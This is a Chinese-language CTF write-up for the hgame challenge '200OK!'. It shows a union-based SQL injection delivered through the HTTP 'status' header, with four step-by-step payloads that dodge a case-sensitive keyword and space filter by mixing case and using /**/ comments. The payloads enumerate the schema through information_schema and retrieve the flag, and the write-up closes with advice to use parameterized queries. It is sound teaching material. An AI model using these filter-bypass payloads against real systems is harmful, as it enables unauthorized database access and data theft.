# 200OK!

## 题目简述

前端会请求 `/server.php`，其 HTTP 请求头 `status` 被直接拼入 SQL。应用仅过滤固定大小写的 `select`、`from`、`union`、`where` 和普通空格，因此可以用关键字大小写混排和 MySQL 注释 `/**/` 代替空格，完成联合查询注入。

## 解题过程

将 payload 放入 `status` 请求头。先查询当前数据库：

```sql
-1'/**/uniOn/**/seLect/**/database();#
```

返回：

```text
week2sqli
```

随后从 `information_schema.tables` 枚举当前库的表名：

```sql
-1'/**/uniOn/**/seLect/**/group_concat(table_name)/**/fRom/**/information_schema.tables/**/Where/**/table_schema='week2sqli';#
```

结果中出现 `f1111111144444444444g`。继续枚举该表字段：

```sql
-1'/**/uniOn/**/seLect/**/group_concat(column_name)/**/fRom/**/information_schema.columns/**/Where/**/table_name='f1111111144444444444g'/**/and/**/table_schema='week2sqli';#
```

得到字段名 `ffffff14gggggg`，最终读取：

```sql
-1'/**/uniOn/**/seLect/**/ffffff14gggggg/**/fRom/**/f1111111144444444444g;#
```

返回：

```text
hgame{c0n9ratu1aTion5_yoU_FXXK_Up_tH3_5Q1}
```

## 方法总结

注入点不只存在于 URL 和请求体，请求头同样可能进入数据库。黑名单只列出少数大小写组合且只删除普通空格时，可以通过混合大小写和注释分隔关键字绕过；根本修复方式仍是参数化查询，并对所有进入 SQL 的字段实行相同的数据流约束。
